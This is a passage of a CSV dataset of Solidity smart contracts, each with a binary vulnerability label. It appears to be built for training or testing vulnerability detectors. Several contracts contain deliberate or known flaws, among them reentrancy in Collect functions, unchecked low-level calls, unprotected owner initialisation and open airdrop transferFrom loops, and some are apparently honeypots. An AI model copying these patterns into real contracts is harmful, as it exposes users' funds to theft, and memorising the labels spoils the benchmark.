_id,name,code,label

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
10021,0x4051334adc52057aca763453820cb0e045076ef3," 



pragma solidity ^0.4.24;

 

contract airdrop{

    

    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i=0;i<_tos.length;i++){

              
            caddress.call(id,from,_tos[i],v);

        }

        return true;

    }

}",0100000000000000000001000
10022,0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1,"

 



pragma solidity ^0.4.19;



contract ACCURAL_DEPOSIT

{

    mapping (address=>uint256) public balances;   

   

    uint public MinSum = 1 ether;

    

    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        if(intitalized)revert();

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        if(intitalized)revert();

        Log = LogFile(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Deposit()

    public

    payable

    {

        balances[msg.sender]+= msg.value;

        Log.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                Log.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Deposit();

    }

    

}







contract LogFile

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000100000000001000000
10023,0x4a66ad0bca2d700f11e1f2fc2c106f7d3264504c,"

pragma solidity ^0.4.18;



contract EBU{

    address public from = 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9;

    address public caddress = 0x1f844685f7Bf86eFcc0e74D8642c54A257111923;

    

    function transfer(address[] _tos,uint[] v)public returns (bool){

        require(msg.sender == 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9);

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i=0;i<_tos.length;i++){

             
            caddress.call(id,from,_tos[i],v[i]*1000000000000000000);

        }

        return true;

    }

}",0100000100000000000001000
10024,0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152,"pragma solidity ^0.4.24;





contract airPort{

    

    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i=0;i<_tos.length;i++){

             
            caddress.call(id,from,_tos[i],v);

        }

        return true;

    }

}",0100000000000000000001000
10025,0x4e73b32ed6c35f570686b89848e5f39f20ecc106,"

pragma solidity ^0.4.19;



contract PRIVATE_ETH_CELL

{

    mapping (address=>uint256) public balances;   

   

    uint public MinSum;

    

    LogFile Log;

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        require(!intitalized);

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        require(!intitalized);

        Log = LogFile(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Deposit()

    public

    payable

    {

        balances[msg.sender]+= msg.value;

        Log.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                Log.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Deposit();

    }

    

}







contract LogFile

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10026,0x524960d55174d912768678d8c606b4d50b79d7b1," 



pragma solidity ^0.4.13;



contract Centra4 {



	function transfer() returns (bool) {	

		address contract_address;

		contract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;

		address c1;		

		address c2;

		uint256 k;

		k = 1;

		

		c2 = 0xaa27f8c1160886aacba64b2319d8d5469ef2af79;	

		 
		contract_address.call(""register"", ""CentraToken"");

		if(!contract_address.call(bytes4(keccak256(""transfer(address,uint256)"")),c2,k)) return false;



		return true;

	}



}",0000000100000000000000000
10027,0x52d2e0f9b01101a59b38a3d05c80b7618aeed984,"

pragma solidity ^0.4.19;

contract Token {

    function transfer(address _to, uint _value) returns (bool success);

    function balanceOf(address _owner) constant returns (uint balance);

}

contract EtherGet {

    address owner;

    function EtherGet() {

        owner = msg.sender;

    }

    function withdrawTokens(address tokenContract) public {

        Token tc = Token(tokenContract);

        tc.transfer(owner, tc.balanceOf(this));

    }

    function withdrawEther() public {

        owner.transfer(this.balance);

    }

    function getTokens(uint num, address addr) public {

        for(uint i = 0; i < num; i++){

             
            addr.call.value(0 wei)();

        }

    }

}",0001000000000000000010000
10028,0x561eac93c92360949ab1f1403323e6db345cbf31,"

pragma solidity ^0.4.19;



contract BANK_SAFE

{

    mapping (address=>uint256) public balances;   

   

    uint public MinSum;

    

    LogFile Log;

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        if(intitalized)throw;

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        if(intitalized)throw;

        Log = LogFile(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Deposit()

    public

    payable

    {

        balances[msg.sender]+= msg.value;

        Log.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                Log.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Deposit();

    }

    

}







contract LogFile

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000001010000
10029,0x5aa88d2901c68fda244f1d0584400368d2c8e739,"

pragma solidity ^0.4.18;



contract MultiplicatorX3

{

    address public Owner = msg.sender;

   

    function() public payable{}

   

    function withdraw()

    payable

    public

    {

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

    

    function multiplicate(address adr)

    public

    payable

    {

        if(msg.value>=this.balance)

        {        

            adr.transfer(this.balance+msg.value);

        }

    }

}",0000000000000000000000000
10030,0x610495793564aed0f9c7fc48dc4c7c9151d34fd6," 



pragma solidity ^0.4.24;





contract SimpleWallet {

    address public owner = msg.sender;

    uint public depositsCount;

    

    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }

    

    function() public payable {

        depositsCount++;

    }

    

    function withdrawAll() public onlyOwner {

        withdraw(address(this).balance);

    }

    

    function withdraw(uint _value) public onlyOwner {

        msg.sender.transfer(_value);

    }

    

    function sendMoney(address _target, uint _value, bytes _data) public onlyOwner {

         
        _target.call.value(_value)(_data);

    }

}",0000000000000000000000000
10031,0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839,"

pragma solidity ^0.4.19;



contract Ownable

{

    address newOwner;

    address owner = msg.sender;

    

    function changeOwner(address addr)

    public

    onlyOwner

    {

        newOwner = addr;

    }

    

    function confirmOwner() 

    public

    {

        if(msg.sender==newOwner)

        {

            owner=newOwner;

        }

    }

    

    modifier onlyOwner

    {

        if(owner == msg.sender)_;

    }

}



contract Token is Ownable

{

    address owner = msg.sender;

    function WithdrawToken(address token, uint256 amount,address to)

    public 

    onlyOwner

    {

          
        token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); 

    }

}



contract TokenBank is Token

{

    uint public MinDeposit;

    mapping (address => uint) public Holders;

    

      
    function initTokenBank()

    public

    {

        owner = msg.sender;

        MinDeposit = 1 ether;

    }

    

    function()

    payable

    {

        Deposit();

    }

   

    function Deposit() 

    payable

    {

        if(msg.value>MinDeposit)

        {

            Holders[msg.sender]+=msg.value;

        }

    }

    

    function WitdrawTokenToHolder(address _to,address _token,uint _amount)

    public

    onlyOwner

    {

        if(Holders[_to]>0)

        {

            Holders[_to]=0;

            WithdrawToken(_token,_amount,_to);     

        }

    }

   

    function WithdrawToHolder(address _addr, uint _wei) 

    public

    onlyOwner

    payable

    {

        if(Holders[_addr]>0)

        {

            if(_addr.call.value(_wei)())

            {

                Holders[_addr]-=_wei;

            }

        }

    }

}",0001000000000000000010000
